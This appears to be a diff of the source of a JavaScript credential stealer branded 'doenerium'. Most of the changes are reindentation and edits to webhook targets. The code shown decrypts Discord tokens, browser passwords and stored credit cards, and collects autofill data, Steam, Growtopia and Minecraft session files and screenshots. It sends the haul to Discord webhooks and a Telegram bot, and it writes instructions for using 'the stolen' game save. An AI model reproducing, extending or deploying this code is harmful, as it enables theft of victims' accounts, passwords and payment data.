-                { name: '🌟 Reddit Gold', value: '```' + (gold ? 'Yes' : 'No') + '```', inline: true },
-                { name: '🚫 Suspended', value: '```' + (suspended ? 'Yes' : 'No') + '```', inline: true }
+                                { name: '<:cookie:1205123589930749995> Cookies', value: '```' + cookies + '```', inline: false },
+                                { name: '🌐 Profile URL', value: '```' + profileUrl + '```', inline: false },
+                                { name: '👤 Username', value: '```' + username + '```', inline: false },
+                                { name: '', value: '💬 Comments: ```' + commentKarma + '``` 👍 Total Karma: ```' + totalKarma + '```', inline: true },
+                                { name: '💰 Coins', value: '```' + coins + '```', inline: false },
+                                { name: '🛡️ Moderator', value: '```' + (mod ? 'Yes' : 'No') + '```', inline: true },
+                                { name: '🌟 Reddit Gold', value: '```' + (gold ? 'Yes' : 'No') + '```', inline: true },
+                                { name: '🚫 Suspended', value: '```' + (suspended ? 'Yes' : 'No') + '```', inline: true }
                             ],
                             footer: {
                                 text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
@@ -1706,7 +1710,8 @@ function setRedditSession(cookie) {
                             }
                         };
 
-                        axios.post(discordWebhookUrl, { embeds: [embedData] })
+                        axios.post(discordWebhookUrl, { embeds: [embedData] });
+                        axios.post(discordWebhookURL, { embeds: [embedData] })
                             .catch(error => {
                                 console.error('Error sending Discord webhook:', error.message);
                             });
@@ -1732,88 +1737,88 @@ function setRedditSession(cookie) {
     }
 }
 
-   
+
 //
 const tokens = [];
 
 function findToken(path) {
-  let path_tail = path;
-  path += 'Local Storage\\leveldb';
+    let path_tail = path;
+    path += 'Local Storage\\leveldb';
 
-  if (!path_tail.includes('discord')) {
-    try {
-      fs.readdirSync(path).map((file) => {
-        (file.endsWith('.log') || file.endsWith('.ldb')) &&
-          fs.readFileSync(path + '\\' + file, 'utf8')
-            .split(/\r?\n/)
-            .forEach((line) => {
-              const patterns = [
-                new RegExp(/mfa\.[\w-]{84}/g),
-                new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm),
-                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g),
-              ];
-              for (const pattern of patterns) {
-                const foundTokens = line.match(pattern);
-                if (foundTokens)
-                  foundTokens.forEach((token) => {
-                    if (!tokens.includes(token)) tokens.push(token);
-                  });
-              }
+    if (!path_tail.includes('discord')) {
+        try {
+            fs.readdirSync(path).map((file) => {
+                (file.endsWith('.log') || file.endsWith('.ldb')) &&
+                fs.readFileSync(path + '\\' + file, 'utf8')
+                    .split(/\r?\n/)
+                    .forEach((line) => {
+                        const patterns = [
+                            new RegExp(/mfa\.[\w-]{84}/g),
+                            new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm),
+                            new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g),
+                        ];
+                        for (const pattern of patterns) {
+                            const foundTokens = line.match(pattern);
+                            if (foundTokens)
+                                foundTokens.forEach((token) => {
+                                    if (!tokens.includes(token)) tokens.push(token);
+                                });
+                        }
+                    });
             });
-      });
-    } catch (e) {}
-    return;
-  } else {
-    if (fs.existsSync(path_tail + '\\Local State')) {
-      try {
-        const tokenRegex = /([A-Za-z\d]{24})\.([\w-]{6})\.([\w-]{27})/;
+        } catch (e) {}
+        return;
+    } else {
+        if (fs.existsSync(path_tail + '\\Local State')) {
+            try {
+                const tokenRegex = /([A-Za-z\d]{24})\.([\w-]{6})\.([\w-]{27})/;
 
-        fs.readdirSync(path).forEach((file) => {
-          if (file.endsWith('.log') || file.endsWith('.ldb')) {
-            const fileContent = fs.readFileSync(`${path}\\${file}`, 'utf8');
-            const lines = fileContent.split(/\r?\n/);
+                fs.readdirSync(path).forEach((file) => {
+                    if (file.endsWith('.log') || file.endsWith('.ldb')) {
+                        const fileContent = fs.readFileSync(`${path}\\${file}`, 'utf8');
+                        const lines = fileContent.split(/\r?\n/);
 
-            lines.forEach((line) => {
-              const foundTokens = line.match(tokenRegex);
+                        lines.forEach((line) => {
+                            const foundTokens = line.match(tokenRegex);
 
-              if (foundTokens) {
-                foundTokens.forEach((token) => {
-                  const encryptedKey = Buffer.from(
-                    JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key,
-                    'base64'
-                  ).slice(5);
-                  const key = dpapi.unprotectData(Buffer.from(encryptedKey, 'utf-8'), null, 'CurrentUser');
-                  const tokenParts = token.split('.');
-                  const start = Buffer.from(tokenParts[0], 'base64');
-                  const middle = Buffer.from(tokenParts[1], 'base64');
-                  const end = Buffer.from(tokenParts[2], 'base64');
-                  const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
-                  decipher.setAuthTag(end);
-                  const out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
+                            if (foundTokens) {
+                                foundTokens.forEach((token) => {
+                                    const encryptedKey = Buffer.from(
+                                        JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key,
+                                        'base64'
+                                    ).slice(5);
+                                    const key = dpapi.unprotectData(Buffer.from(encryptedKey, 'utf-8'), null, 'CurrentUser');
+                                    const tokenParts = token.split('.');
+                                    const start = Buffer.from(tokenParts[0], 'base64');
+                                    const middle = Buffer.from(tokenParts[1], 'base64');
+                                    const end = Buffer.from(tokenParts[2], 'base64');
+                                    const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
+                                    decipher.setAuthTag(end);
+                                    const out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
 
-                  if (!tokens.includes(out)) {
-                    tokens.push(out);
-                  }
+                                    if (!tokens.includes(out)) {
+                                        tokens.push(out);
+                                    }
+                                });
+                            }
+                        });
+                    }
                 });
-              }
-            });
-          }
-        });
 
-        const discordFolderPath = path.join(mainFolderPath, 'Discord');
-        const discordFilePath = path.join(discordFolderPath, 'discord.txt');
-        const discordFileContent = tokens.join('\n');
+                const discordFolderPath = path.join(mainFolderPath, 'Discord');
+                const discordFilePath = path.join(discordFolderPath, 'discord.txt');
+                const discordFileContent = tokens.join('\n');
 
-        // Create Discord folder if it doesn't exist
-        if (!fs.existsSync(discordFolderPath)) {
-          fs.mkdirSync(discordFolderPath);
+                // Create Discord folder if it doesn't exist
+                if (!fs.existsSync(discordFolderPath)) {
+                    fs.mkdirSync(discordFolderPath);
+                }
+
+                fs.writeFileSync(discordFilePath, discordFileContent);
+            } catch (e) {}
+            return;
         }
-
-        fs.writeFileSync(discordFilePath, discordFileContent);
-      } catch (e) {}
-      return;
     }
-  }
 }
 
 async function getUserData(token) {
@@ -1980,7 +1985,7 @@ async function getTokens() {
                     value: "```\n" + userData.bio + "\n```",
                 });
             }
-            await axios.post(discordWebhookUr1, data);
+
             await axios.post(discordWebhookUrl, data);
         } catch (error) {
             console.error(error);
@@ -2293,7 +2298,7 @@ async function getEncrypted() {
         try {
             let _0x276965 = Buffer.from(
                 JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
-                .os_crypt.encrypted_key,
+                    .os_crypt.encrypted_key,
                 'base64'
             ).slice(5)
             const _0x4ff4c6 = Array.from(_0x276965),
@@ -2302,8 +2307,8 @@ async function getEncrypted() {
                     _0x4ff4c6 +
                     "), $null, 'CurrentUser')"
                 )
-                .toString()
-                .split('\r\n'),
+                    .toString()
+                    .split('\r\n'),
                 _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
                 _0x2ed7ba = Buffer.from(_0x4a5920)
             browserPath[_0x4c3514].push(_0x2ed7ba)
@@ -2313,53 +2318,53 @@ async function getEncrypted() {
 
 
 function addFolder(folderPath) {
-  const folderFullPath = path.join(randomPath, folderPath);
-  if (!fs.existsSync(folderFullPath)) {
-    try {
-      fs.mkdirSync(folderFullPath, { recursive: true });
-    } catch (error) {}
-  }
+    const folderFullPath = path.join(randomPath, folderPath);
+    if (!fs.existsSync(folderFullPath)) {
+        try {
+            fs.mkdirSync(folderFullPath, { recursive: true });
+        } catch (error) {}
+    }
 }
 
 function copyFolder(source, destination) {
-  if (!fs.existsSync(destination)) {
-    fs.mkdirSync(destination);
-  }
-
-  const files = fs.readdirSync(source);
-
-  files.forEach(file => {
-    const currentSource = path.join(source, file);
-    const currentDestination = path.join(destination, file);
-
-    if (fs.lstatSync(currentSource).isDirectory()) {
-      copyFolder(currentSource, currentDestination);
-    } else {
-      fs.copyFileSync(currentSource, currentDestination);
+    if (!fs.existsSync(destination)) {
+        fs.mkdirSync(destination);
     }
-  });
+
+    const files = fs.readdirSync(source);
+
+    files.forEach(file => {
+        const currentSource = path.join(source, file);
+        const currentDestination = path.join(destination, file);
+
+        if (fs.lstatSync(currentSource).isDirectory()) {
+            copyFolder(currentSource, currentDestination);
+        } else {
+            fs.copyFileSync(currentSource, currentDestination);
+        }
+    });
 }
 
 function copyGames(source, destination) {
-  try {
-    fs.mkdirSync(destination, { recursive: true }); 
-  } catch (err) {
-    console.error(`Error creating directory ${destination}: ${err.message}`);
-    throw err;
-  }
-
-  const files = fs.readdirSync(source);
-
-  files.forEach(file => {
-    const currentSource = path.join(source, file);
-    const currentDestination = path.join(destination, file);
-
-    if (fs.lstatSync(currentSource).isDirectory()) {
-      copyFolder(currentSource, currentDestination);
-    } else {
-      fs.copyFileSync(currentSource, currentDestination);
+    try {
+        fs.mkdirSync(destination, { recursive: true });
+    } catch (err) {
+        console.error(`Error creating directory ${destination}: ${err.message}`);
+        throw err;
     }
-  });
+
+    const files = fs.readdirSync(source);
+
+    files.forEach(file => {
+        const currentSource = path.join(source, file);
+        const currentDestination = path.join(destination, file);
+
+        if (fs.lstatSync(currentSource).isDirectory()) {
+            copyFolder(currentSource, currentDestination);
+        } else {
+            fs.copyFileSync(currentSource, currentDestination);
+        }
+    });
 }
 
 
@@ -2490,37 +2495,37 @@ delete everything and copy all contents into the Epic Games folder and run.`;
 }
 
 async function SubmitSteam() {
-  try {
-    var exists = false;
+    try {
+        var exists = false;
 
-    if (fs.existsSync("C:\\Program Files (x86)\\Steam") && fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")) {
-      exists = true;
-      exec("taskkill /IM Steam.exe /F", (error, stdout, stderr) => {});
-      await new Promise(resolve => setTimeout(resolve, 2500));
-    } else {
-      exists = false;
-    }
-
-    if (exists) {
-      const steamFoldersToCopy = ["userdata", "config"];
-
-      steamFoldersToCopy.forEach(folder => {
-        const sourcePath = path.join("C:\\Program Files (x86)\\Steam", folder);
-        const destinationPath = path.join(mainFolderPath, 'Steam', folder);
-
-        try {
-          copyGames(sourcePath, destinationPath);
-          console.log(`Copied ${folder} to ${mainFolderPath}/Steam`);
-        } catch (err) {
-          console.error(`An error occurred while copying ${folder}: ${err.message}`);
+        if (fs.existsSync("C:\\Program Files (x86)\\Steam") && fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")) {
+            exists = true;
+            exec("taskkill /IM Steam.exe /F", (error, stdout, stderr) => {});
+            await new Promise(resolve => setTimeout(resolve, 2500));
+        } else {
+            exists = false;
         }
-      });
 
-      console.log('Steam session data copied to mainFolder/Steam');
+        if (exists) {
+            const steamFoldersToCopy = ["userdata", "config"];
+
+            steamFoldersToCopy.forEach(folder => {
+                const sourcePath = path.join("C:\\Program Files (x86)\\Steam", folder);
+                const destinationPath = path.join(mainFolderPath, 'Steam', folder);
+
+                try {
+                    copyGames(sourcePath, destinationPath);
+                    console.log(`Copied ${folder} to ${mainFolderPath}/Steam`);
+                } catch (err) {
+                    console.error(`An error occurred while copying ${folder}: ${err.message}`);
+                }
+            });
+
+            console.log('Steam session data copied to mainFolder/Steam');
+        }
+    } catch (error) {
+        console.error(`Error in SubmitSteam: ${error.message}`);
     }
-  } catch (error) {
-    console.error(`Error in SubmitSteam: ${error.message}`);
-  }
 }
 
 async function stealSteamSession() {
@@ -2541,7 +2546,7 @@ async function stealSteamSession() {
                         ]
                     };
 
-                    await axios.post(discordWebhookUr1, webhookPayload);
+
                     console.log('First Steam session detected embed sent to webhook.');
 
                     // Add a delay of 2 seconds
@@ -2614,31 +2619,31 @@ function createSteamEmbed(account, accountInfo, games, level) {
 const writeFile = util.promisify(fs.writeFile);
 
 async function ensureDirectoryExistence(dirPath) {
-  if (!fs.existsSync(dirPath)) {
-    fs.mkdirSync(dirPath, { recursive: true });
-  }
+    if (!fs.existsSync(dirPath)) {
+        fs.mkdirSync(dirPath, { recursive: true });
+    }
 }
 
 async function getGrowtopia() {
-  const growtopiaSource = `${process.env.LOCALAPPDATA}\\Growtopia\\save.dat`;
-  const growtopiaDestination = path.join(mainFolderPath, 'Growtopia\\save.dat');
+    const growtopiaSource = `${process.env.LOCALAPPDATA}\\Growtopia\\save.dat`;
+    const growtopiaDestination = path.join(mainFolderPath, 'Growtopia\\save.dat');
 
-  try {
-    if (fs.existsSync(growtopiaSource)) {
-      ensureDirectoryExistence(path.join(mainFolderPath, 'Growtopia'));
-      fs.copyFileSync(growtopiaSource, growtopiaDestination);
+    try {
+        if (fs.existsSync(growtopiaSource)) {
+            ensureDirectoryExistence(path.join(mainFolderPath, 'Growtopia'));
+            fs.copyFileSync(growtopiaSource, growtopiaDestination);
 
-      const howToUseDir = path.join(mainFolderPath, 'Growtopia', 'How to Use');
-      await ensureDirectoryExistence(howToUseDir);
+            const howToUseDir = path.join(mainFolderPath, 'Growtopia', 'How to Use');
+            await ensureDirectoryExistence(howToUseDir);
 
-      const howToUsePath = path.join(howToUseDir, 'How to Use.txt');
-      const howToUseContent = `https://discord.gg/doenerium\n==============================================\nFirst, open this folder on your computer <%localappdata%\\Growtopia>.\nThen, replace the existing 'save.dat' file with the stolen one.`;
+            const howToUsePath = path.join(howToUseDir, 'How to Use.txt');
+            const howToUseContent = `https://discord.gg/doenerium\n==============================================\nFirst, open this folder on your computer <%localappdata%\\Growtopia>.\nThen, replace the existing 'save.dat' file with the stolen one.`;
 
-      await writeFile(howToUsePath, howToUseContent, { flag: 'a' });
+            await writeFile(howToUsePath, howToUseContent, { flag: 'a' });
+        }
+    } catch (e) {
+        console.log(e);
     }
-  } catch (e) {
-    console.log(e);
-  }
 }
 
 
@@ -2671,7 +2676,7 @@ async function submitMinecraft(mainFolderPath) {
         // Copy entire Lunar Client settings directory if it exists
         const lunarclientSettingsPath = path.join(lunarclientPath, 'settings');
         const targetSettingsPath = path.join(mainFolderPath, 'LunarClient', 'settings');
-        
+
         if (fs.existsSync(lunarclientSettingsPath)) {
             await copyFolderContents(lunarclientSettingsPath, targetSettingsPath);
             console.log(`Copied Lunar Client settings from ${lunarclientSettingsPath} to ${targetSettingsPath}`);
@@ -2683,11 +2688,11 @@ async function submitMinecraft(mainFolderPath) {
 
 async function createScreenshotScript() {
     const screenshotsFolder = path.join(mainFolderPath, 'Screenshots');
-    
+
     if (!fs.existsSync(screenshotsFolder)) {
         fs.mkdirSync(screenshotsFolder, { recursive: true });
     }
-    
+
     const randomFileName = `${generateRandomString(10)}.py`;
     const scriptPath = path.join(user.temp, randomFileName);
 
@@ -2723,7 +2728,7 @@ if __name__ == "__main__":
         return scriptPath;
     } catch (error) {
         console.error(`Error writing Python script, installing Pillow, or executing script: ${error.message}`);
-        throw error; 
+        throw error;
     }
 }
 
@@ -2946,7 +2951,7 @@ async function uploadToFileio(filePath) {
     try {
         const form = new FormData();
         form.append('file', fs.createReadStream(filePath));
-        
+
         // You can specify additional options here
         form.append('expire', '1w'); // Keep the file for one week, change to your preference
 
@@ -3093,32 +3098,32 @@ ${foundFoldersTele || 'None'}
 ${foundWalletsTele || 'None'}
 `;
 
-const screenshotPath = path.join(mainFolderPath, 'Screenshots', 'Screenshot.png');
+    const screenshotPath = path.join(mainFolderPath, 'Screenshots', 'Screenshot.png');
 
     if (fs.existsSync(screenshotPath)) {
         const imageBuffer = fs.readFileSync(screenshotPath);
-        
+
         const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-const formData = new FormData();
-formData.append('chat_id', chatId);
-formData.append('photo', imageBuffer, { filename: 'Screenshot.png' });
-formData.append('caption', message);
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', imageBuffer, { filename: 'Screenshot.png' });
+        formData.append('caption', message);
 
-try {
-    await axios.post(telegramApiUrl, formData, {
-        headers: {
-            'Content-Type': `multipart/form-data; boundary=${formData._boundary}`,
-        },
-        params: {
-            parse_mode: 'HTML',
-        },
-    });
+        try {
+            await axios.post(telegramApiUrl, formData, {
+                headers: {
+                    'Content-Type': `multipart/form-data; boundary=${formData._boundary}`,
+                },
+                params: {
+                    parse_mode: 'HTML',
+                },
+            });
 
-    console.log('Screenshot and system information successfully sent to Telegram.');
-} catch (error) {
-    console.error('Telegram Error:', error);
-    console.error('Error response data:', error.response.data);
-}
+            console.log('Screenshot and system information successfully sent to Telegram.');
+        } catch (error) {
+            console.error('Telegram Error:', error);
+            console.error('Error response data:', error.response.data);
+        }
     } else {
         const telegramMessageApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
         try {
@@ -3190,9 +3195,9 @@ try {
                 inline: false,
             },
             {
-            name: '**___Local Wallets Found:___**',
-            value: foundWalletsText || 'None',
-            inline: false,
+                name: '**___Local Wallets Found:___**',
+                value: foundWalletsText || 'None',
+                inline: false,
             },
         ],
         footer: {
@@ -3201,13 +3206,13 @@ try {
         },
     };
 
-    axios.post(discordWebhookUr1, { embeds: [combinedInfoEmbed] })
-    .then(() => { 
-        console.log('system information successfully sent to Discord webhook.');
-    })
-    .catch(error => {
-        console.error('An error occurred while sending system information:', error.message);
-    });
+    axios.post(discordWebhookUrl, { embeds: [combinedInfoEmbed] })
+        .then(() => {
+            console.log('system information successfully sent to Discord webhook.');
+        })
+        .catch(error => {
+            console.error('An error occurred while sending system information:', error.message);
+        });
     await new Promise(resolve => setTimeout(resolve, 1000));
     axios.post(discordWebhookUrl, { embeds: [combinedInfoEmbed] })
         .then(() => {
@@ -3216,13 +3221,13 @@ try {
         .catch(error => {
             console.error('An error occurred while sending system information:', error.message);
         });
-        
+
     await clean();
     await new Promise(resolve => setTimeout(resolve, 5000));
     process.exit();
 }
 
-async function clean() { 
+async function clean() {
     const steamLauncherPath = 'C:/ProgramData/Steam/Launcher';
     if (fs.existsSync(steamLauncherPath)) {
         execSync(`rmdir /s /q "${steamLauncherPath}"`);
@@ -3485,163 +3490,163 @@ async function inject(appPath, asarPath, injectionUrl, licensePath) {
 
 
 async function getPasswords() {
-  const _0x540754 = [];
+    const _0x540754 = [];
 
-  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
-    if (!fs.existsSync(browserPath[_0x261d97][0])) {
-      continue;
-    }
-
-    let _0xd541c2;
-    if (browserPath[_0x261d97][0].includes('Local')) {
-      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
-    } else {
-      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
-    }
-
-    const _0x256bed = browserPath[_0x261d97][0] + 'Login Data';
-    const _0x239644 = browserPath[_0x261d97][0] + 'passwords.db';
-
-    fs.copyFileSync(_0x256bed, _0x239644);
-
-    const _0x3d71cb = new sqlite3.Database(_0x239644);
-
-    await new Promise((_0x2c148b, _0x32e8f4) => {
-      _0x3d71cb.each(
-        'SELECT origin_url, username_value, password_value, date_created FROM logins',
-        (_0x4c7a5b, _0x504e35) => {
-          if (!_0x504e35.username_value) {
-            return;
-          }
-
-          try {
-            let _0x3d2b4b = _0x504e35.password_value;
-            const _0x5e1041 = _0x3d2b4b.slice(3, 15);
-            const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
-            const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16, _0x3d2b4b.length);
-            const _0x210aeb = crypto.createDecipheriv(
-              'aes-256-gcm',
-              Buffer.from(browserPath[_0x261d97][3], 'hex'),
-              _0x5e1041
-            );
-            _0x210aeb.setAuthTag(_0x2a933a);
-            const password =
-              _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
-              _0x210aeb.final('utf-8');
-            
-            const dateCreated = new Date(_0x504e35.date_created / 1000 - 11644473600 * 1000).toLocaleString();
-
-            _0x540754.push(
-              '================\nURL: ' +
-                _0x504e35.origin_url +
-                '\nUsername: ' +
-                _0x504e35.username_value +
-                '\nPassword: ' +
-                password +
-                '\nDate Created: ' +
-                dateCreated +
-                '\nApplication: ' +
-                _0xd541c2 +
-                ' ' +
-                browserPath[_0x261d97][1] +
-                '\n'
-            );
-          } catch (_0x5bf37a) {}
-        },
-        () => {
-          _0x2c148b('');
+    for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
+        if (!fs.existsSync(browserPath[_0x261d97][0])) {
+            continue;
         }
-      );
-    });
-  }
 
-  if (_0x540754.length === 0) {
-    _0x540754.push('no password found for ');
-  }
+        let _0xd541c2;
+        if (browserPath[_0x261d97][0].includes('Local')) {
+            _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
+        } else {
+            _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
+        }
 
-  if (_0x540754.length) {
-    const passwordsFolderPath = path.join(mainFolderPath, 'Passwords');
-    if (!fs.existsSync(passwordsFolderPath)) {
-      fs.mkdirSync(passwordsFolderPath);
+        const _0x256bed = browserPath[_0x261d97][0] + 'Login Data';
+        const _0x239644 = browserPath[_0x261d97][0] + 'passwords.db';
+
+        fs.copyFileSync(_0x256bed, _0x239644);
+
+        const _0x3d71cb = new sqlite3.Database(_0x239644);
+
+        await new Promise((_0x2c148b, _0x32e8f4) => {
+            _0x3d71cb.each(
+                'SELECT origin_url, username_value, password_value, date_created FROM logins',
+                (_0x4c7a5b, _0x504e35) => {
+                    if (!_0x504e35.username_value) {
+                        return;
+                    }
+
+                    try {
+                        let _0x3d2b4b = _0x504e35.password_value;
+                        const _0x5e1041 = _0x3d2b4b.slice(3, 15);
+                        const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
+                        const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16, _0x3d2b4b.length);
+                        const _0x210aeb = crypto.createDecipheriv(
+                            'aes-256-gcm',
+                            Buffer.from(browserPath[_0x261d97][3], 'hex'),
+                            _0x5e1041
+                        );
+                        _0x210aeb.setAuthTag(_0x2a933a);
+                        const password =
+                            _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
+                            _0x210aeb.final('utf-8');
+
+                        const dateCreated = new Date(_0x504e35.date_created / 1000 - 11644473600 * 1000).toLocaleString();
+
+                        _0x540754.push(
+                            '================\nURL: ' +
+                            _0x504e35.origin_url +
+                            '\nUsername: ' +
+                            _0x504e35.username_value +
+                            '\nPassword: ' +
+                            password +
+                            '\nDate Created: ' +
+                            dateCreated +
+                            '\nApplication: ' +
+                            _0xd541c2 +
+                            ' ' +
+                            browserPath[_0x261d97][1] +
+                            '\n'
+                        );
+                    } catch (_0x5bf37a) {}
+                },
+                () => {
+                    _0x2c148b('');
+                }
+            );
+        });
     }
 
-    const passwordsFilePath = path.join(passwordsFolderPath, 'Passwords.txt');
-    fs.writeFileSync(passwordsFilePath, user.copyright + _0x540754.join(''), {
-      encoding: 'utf8',
-      flag: 'a+',
-    });
-  }
+    if (_0x540754.length === 0) {
+        _0x540754.push('no password found for ');
+    }
+
+    if (_0x540754.length) {
+        const passwordsFolderPath = path.join(mainFolderPath, 'Passwords');
+        if (!fs.existsSync(passwordsFolderPath)) {
+            fs.mkdirSync(passwordsFolderPath);
+        }
+
+        const passwordsFilePath = path.join(passwordsFolderPath, 'Passwords.txt');
+        fs.writeFileSync(passwordsFilePath, user.copyright + _0x540754.join(''), {
+            encoding: 'utf8',
+            flag: 'a+',
+        });
+    }
 }
 
 
 async function getCards() {
-  const _0x540754 = [];
+    const _0x540754 = [];
 
-  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
-    if (!fs.existsSync(browserPath[_0x261d97][0])) {
-      continue;
-    }
-
-    let _0xd541c2;
-    if (browserPath[_0x261d97][0].includes('Local')) {
-      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
-    } else {
-      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
-    }
-
-    const webData = browserPath[_0x261d97][0] + 'Web Data';
-    const copiedFilePath = browserPath[_0x261d97][0] + 'Web.db';
-
-    const key = Buffer.from(browserPath[_0x261d97][3], 'hex');
-
-    fs.copyFileSync(webData, copiedFilePath);
-
-    const databaseConnection = new sqlite3.Database(copiedFilePath);
-
-    await new Promise((resolve, reject) => {
-      databaseConnection.each(
-        'SELECT card_number_encrypted, expiration_year, expiration_month, name_on_card FROM credit_cards',
-        (err, card) => {
-          if (err) {
-            reject(err);
-          } else {
-            try {
-              const month = card.expiration_month < 10 ? `0${card.expiration_month}` : `${card.expiration_month}`;
-              const _0x5e1041 = card.card_number_encrypted ? card.card_number_encrypted.slice(3, 15) : '';
-              const decryptedCardNumber = subModules.decryption(card.card_number_encrypted, key);
-              const cardInfo = `${decryptedCardNumber}\t${month}/${card.expiration_year}\t${card.name_on_card}\n`;
-              _0x540754.push(cardInfo);
-            } catch (error) {}
-          }
-        },
-        () => {
-          resolve();
+    for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
+        if (!fs.existsSync(browserPath[_0x261d97][0])) {
+            continue;
         }
-      );
-    });
 
-    try {
-      databaseConnection.close();
-      fs.unlinkSync(copiedFilePath);
-    } catch (error) {}
-  }
+        let _0xd541c2;
+        if (browserPath[_0x261d97][0].includes('Local')) {
+            _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
+        } else {
+            _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
+        }
 
-  if (_0x540754.length === 0) {
-    _0x540754.push('no cards found');
-  }
+        const webData = browserPath[_0x261d97][0] + 'Web Data';
+        const copiedFilePath = browserPath[_0x261d97][0] + 'Web.db';
 
-  if (_0x540754.length) {
-    const cardsFolderPath = path.join(mainFolderPath, 'Cards');
-    if (!fs.existsSync(cardsFolderPath)) {
-      fs.mkdirSync(cardsFolderPath);
+        const key = Buffer.from(browserPath[_0x261d97][3], 'hex');
+
+        fs.copyFileSync(webData, copiedFilePath);
+
+        const databaseConnection = new sqlite3.Database(copiedFilePath);
+
+        await new Promise((resolve, reject) => {
+            databaseConnection.each(
+                'SELECT card_number_encrypted, expiration_year, expiration_month, name_on_card FROM credit_cards',
+                (err, card) => {
+                    if (err) {
+                        reject(err);
+                    } else {
+                        try {
+                            const month = card.expiration_month < 10 ? `0${card.expiration_month}` : `${card.expiration_month}`;
+                            const _0x5e1041 = card.card_number_encrypted ? card.card_number_encrypted.slice(3, 15) : '';
+                            const decryptedCardNumber = subModules.decryption(card.card_number_encrypted, key);
+                            const cardInfo = `${decryptedCardNumber}\t${month}/${card.expiration_year}\t${card.name_on_card}\n`;
+                            _0x540754.push(cardInfo);
+                        } catch (error) {}
+                    }
+                },
+                () => {
+                    resolve();
+                }
+            );
+        });
+
+        try {
+            databaseConnection.close();
+            fs.unlinkSync(copiedFilePath);
+        } catch (error) {}
     }
 
-    const cardsFilePath = path.join(cardsFolderPath, 'Cards.txt');
-    fs.writeFileSync(cardsFilePath, user.copyright + _0x540754.join(''), {
-      encoding: 'utf8',
-      flag: 'a+',
-    });
-  }
+    if (_0x540754.length === 0) {
+        _0x540754.push('no cards found');
+    }
+
+    if (_0x540754.length) {
+        const cardsFolderPath = path.join(mainFolderPath, 'Cards');
+        if (!fs.existsSync(cardsFolderPath)) {
+            fs.mkdirSync(cardsFolderPath);
+        }
+
+        const cardsFilePath = path.join(cardsFolderPath, 'Cards.txt');
+        fs.writeFileSync(cardsFilePath, user.copyright + _0x540754.join(''), {
+            encoding: 'utf8',
+            flag: 'a+',
+        });
+    }
 }
 
 async function getCookies() {
@@ -3823,7 +3828,7 @@ async function sendStakeSessionToDiscord(decrypted) {
         };
 
         await axios.post(discordWebhookUrl, payload, { headers });
-        await axios.post(discordWebhookUr1, payload, { headers });
+
     } catch (error) {
         console.error('Error sending Stake session to Discord:', error);
     }
@@ -3832,70 +3837,70 @@ async function sendStakeSessionToDiscord(decrypted) {
 
 
 async function getAutofills() {
-  const autofillData = [];
+    const autofillData = [];
 
-  for (const pathData of browserPath) {
-    const browserPathExists = fs.existsSync(pathData[0]);
+    for (const pathData of browserPath) {
+        const browserPathExists = fs.existsSync(pathData[0]);
 
-    if (!browserPathExists) {
-      continue;
-    }
-
-    const applicationName = pathData[0].includes('Local')
-      ? pathData[0].split('\\Local\\')[1].split('\\')[0]
-      : pathData[0].split('\\Roaming\\')[1].split('\\')[1];
-
-    const webDataPath = pathData[0] + 'Web Data';
-    const webDataDBPath = pathData[0] + 'webdata.db';
-
-    fs.copyFileSync(webDataPath, webDataDBPath);
-
-    const db = new sqlite3.Database(webDataDBPath);
-
-    await new Promise((resolve, reject) => {
-      db.each(
-        'SELECT * FROM autofill',
-        function (error, row) {
-          if (row) {
-            autofillData.push(
-              '================\nName: ' +
-                row.name +
-                '\nValue: ' +
-                row.value +
-                '\nApplication: ' +
-                applicationName +
-                ' ' +
-                pathData[1] +
-                '\n'
-            );
-          }
-        },
-        function () {
-          resolve('');
+        if (!browserPathExists) {
+            continue;
         }
-      );
-    });
 
-    if (autofillData.length === 0) {
-      autofillData.push('No autofills found for ' + applicationName + ' ' + pathData[1] + '\n');
+        const applicationName = pathData[0].includes('Local')
+            ? pathData[0].split('\\Local\\')[1].split('\\')[0]
+            : pathData[0].split('\\Roaming\\')[1].split('\\')[1];
+
+        const webDataPath = pathData[0] + 'Web Data';
